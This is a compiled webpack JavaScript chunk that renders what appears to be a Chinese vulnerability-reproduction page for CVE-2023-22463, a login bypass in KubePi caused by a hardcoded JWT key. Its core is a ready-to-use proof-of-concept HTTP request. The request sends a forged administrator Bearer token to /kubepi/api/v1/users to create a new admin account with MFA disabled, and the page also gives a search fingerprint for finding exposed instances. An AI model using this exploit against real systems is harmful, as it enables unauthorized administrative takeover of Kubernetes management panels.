(window.webpackJsonp=window.webpackJsonp||[]).push([[516],{2279:function(s,a,e){s.exports=e.p+"assets/img/1690696537476-99918b4b-0282-46f5-a2ed-231c59aa0400.124d6d33.png"},2280:function(s,a,e){s.exports=e.p+"assets/img/image-20230813162451716.f3ee0a8a.png"},3383:function(s,a,e){"use strict";e.r(a);var t=e(64),n=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"kubepi-jwtsigkey-登陆绕过漏洞-cve-2023-22463"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#kubepi-jwtsigkey-登陆绕过漏洞-cve-2023-22463"}},[s._v("#")]),s._v(" KubePi JwtSigKey 登陆绕过漏洞 CVE-2023-22463")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("KubePi 中存在 JWT硬编码，攻击者通过硬编码可以获取服务器后台管理权限，添加任意用户")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("KubePi ")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v('"kubepi"')]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登陆页面")]),s._v(" "),a("p",[a("img",{attrs:{src:e(2279),alt:"img"}})]),s._v(" "),a("p",[s._v("验证POC")]),s._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token request-line"}},[a("span",{pre:!0,attrs:{class:"token method property"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token request-target url"}},[s._v("/kubepi/api/v1/users")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token http-version property"}},[s._v("HTTP/1.1")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header"}},[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Host")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("{{Hostname}}")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header"}},[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("User-Agent")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header"}},[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("accept")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("application/json")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header"}},[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Accept-Encoding")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("gzip, deflate")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token header"}},[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[s._v("Authorization")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token header-value"}},[s._v("Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8")])]),s._v('\n\n{\n  "authenticate": {\n       "password": "{{randstr}}"\n  },\n  "email": "{{randstr}}@qq.com",\n  "isAdmin": true,\n  "mfa": {\n          "enable": false\n   },\n  "name": "{{randstr}}",\n  "nickName": "{{randstr}}",\n  "roles": [\n       "Supper User"\n  ]\n}\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("p",[a("img",{attrs:{src:e(2280),alt:"image-20230813162451716"}})])],1)}),[],!1,null,null,null);a.default=n.exports}}]);